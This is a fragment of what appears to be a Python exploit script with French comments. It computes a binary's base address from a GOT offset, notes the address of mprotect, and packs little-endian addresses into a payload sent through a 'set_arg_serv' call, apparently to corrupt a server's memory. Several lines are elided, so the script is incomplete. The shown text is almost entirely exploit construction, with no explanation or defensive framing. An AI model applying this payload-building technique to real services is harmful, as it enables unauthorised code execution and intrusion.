...
def main():
	...
	# 0011c520 = adresse de mprotect

	# Calcul de l'adresse de base
	print("Adress before calc")
	print(base_addr)
	print("Adress after - got")
	addr = int(base_addr) - 0x3f94
	print(addr)
	print("Adress after - got")
	write_addr = addr + 0x10d0
	...
	(0).to_bytes(8,'little') + \
	int(write_addr).to_bytes(4,'little') + \
	(0).to_bytes(4,'little') + \
	int('4').to_bytes(4,'little') + \
	int(0x3fAc + int(addr)).to_bytes(4,'little') + \
	int(256).to_bytes(4,'little')

	print(set_arg_serv(b'',1,res))
